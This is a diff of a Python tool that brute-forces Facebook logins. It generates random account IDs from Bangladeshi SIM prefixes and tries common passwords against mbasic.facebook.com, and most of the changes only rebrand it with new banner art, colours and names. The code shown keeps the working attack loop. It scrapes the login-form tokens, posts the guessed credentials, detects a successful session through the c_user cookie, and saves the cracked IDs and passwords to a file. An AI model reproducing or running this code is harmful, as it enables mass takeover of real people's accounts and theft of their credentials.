@@ -116,14 +116,14 @@ def jalan(z):
   
 logo=("""  
  \033[1;37m
-╔═╗╔═╗╔═╗
-║═╣╠╦╝╠═╣
-╚═╝╩╚═╩ ╩ 
+
+
+
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━╦━━━━━━━━━━━━━━━╗
 ┃ ██████  ██████   █████  ┃ ➊ OWNER ➸ BRA ┃
-┃ ██   ██ ██   ██ ██   ██ ┃ ➋ TOOLS ➸ BRA ┃
-┃ ██████  ██████  ███████ ┃ ➌ VRSON ➸ 0.1 ┃
-┃ ██   ██ ██   ██ ██   ██ ┃ ➍ STTUS ➸ OWN ┃
+┃ ██   ██ ██   ██ ██   ██ ┃ ➋ TOOLS ➸ BRA ┃ ╔═╗╔═╗╔═╗
+┃ ██████  ██████  ███████ ┃ ➌ VRSON ➸ 0.1 ┃ ║═╣╠╦╝╠═╣
+┃ ██   ██ ██   ██ ██   ██ ┃ ➍ STTUS ➸ OWN ┃ ╚═╝╩╚═╩ ╩ 
 ┃ ██████  ██   ██ ██   ██ ┃ ➎ RANKS ➸ 1.X ┃
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━╩━━━━━━━━━━━━━━━╝
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
@@ -153,16 +153,16 @@ def cek_apk(session,coki):
 def Main():
 	os.system('clear')
 	print(logo)
-	print("\033[1;97m[1] RANDOM CLONEING")
-	print("\033[1;37m[2] CONTACT ADMIN & FB GROUP")
-	print("\033[1;37m[3] FOLLOW MY FB PROFILE")
-	print("\033[1;37m[4] JOIN MESSENGER GROUP")
-	print('\033[1;37m[0] EXIT PROGRAMMING')
+	print("\033[1;91m[1] RANDOM CLONEING")
+	print("\033[1;92m[2] CONTACT ADMIN & FB GROUP")
+	print("\033[1;93m[3] FOLLOW MY FB PROFILE")
+	print("\033[1;94m[4] JOIN MESSENGER GROUP")
+	print('\033[1;95m[0] EXIT PROGRAMMING')
 	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 	opt = input('Choose option >>> ')
 	if opt == '1':
 		os.system('xdg-open https://www.facebook.com/')
-		virusA()
+		BRA()
 	if opt in ["B","2"]:
 		admin()
 	if opt in ["C","3"]:
@@ -198,7 +198,7 @@ def admin():
 	if bal =='0':
 		Main()
 		
-def virusA():
+def BRA():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -217,18 +217,18 @@ def virusA():
 		print(logo)
 		tl = str(len(user))
 		
-		print('\033[32;1m┏━[\033[34;1m•\033[32;1m] TOTAL ACCOUNT ► '+tl)
-		print('\033[32;1m┣━[\033[34;1m•\033[32;1m] COUNTRY       ► Bangladesh')
-		print(f'\033[32;1m┣━[\033[34;1m•\033[32;1m] SIM CODE   : \033[1;92m {kode} ')
-		print('\033[1;97m┗━[\033[34;1m•\033[32;1m] \033[1;92mAIRPALNE \033[34;1m[ \033[33;1m<ON/OFF\033[34;1m] ')
+		print('\033[32;1m┏━[\033[34;1m•\033[32;5m] TOTAL ACCOUNT ► '+tl)
+		print('\033[32;1m┣━[\033[34;1m•\033[32;5m] COUNTRY       ► Bangladesh')
+		print(f'\033[32;1m┣━[\033[34;1m•\033[32;5m] SIM CODE   : \033[1;92m {kode} ')
+		print('\033[32;1m┗━[\033[34;1m•\033[32;5m] IF NO RESULTS (ON/OFF) AIRPLANE MODE')
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','freefire','Free fire','iloveyou','Bangladesh','bangladesh','i love you']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [💉] Crack process has been completed')
-	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(' [💀] CRACK PROCESS HAS BEEN COMPLETED')
+	print(' [❤️‍🩹] IDS SAVED IN ▶SDCARD▶BRA-OK.txt [OR] BRA-CP.txt')
 	print(50*'_')
 	exit()
 
@@ -240,13 +240,13 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSecrching\033[1;90m] <> \033[1;96m%s/%s\033[1;90m <> \033[1;90m[\033[1;92mMALS:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;95m[\033[1;93mSCAN\033[1;95m] <> \033[1;96m%s/%s\033[1;95m <> \033[1;95m[\033[1;92mBRA-OK:%s\033[1;95m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -255,6 +255,7 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
+            
             header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
@@ -274,14 +275,14 @@ def b(uid,pwx,tl):
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-            #	botok(uid,ps)
+                #botok(uid,ps)
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [MALS] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [BRA] '+cid+' | '+ps+'\33[0;92m')
                 #print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/MALS-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/BRA-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -291,3 +292,4 @@ def b(uid,pwx,tl):
         pass
 Main()
 
+	
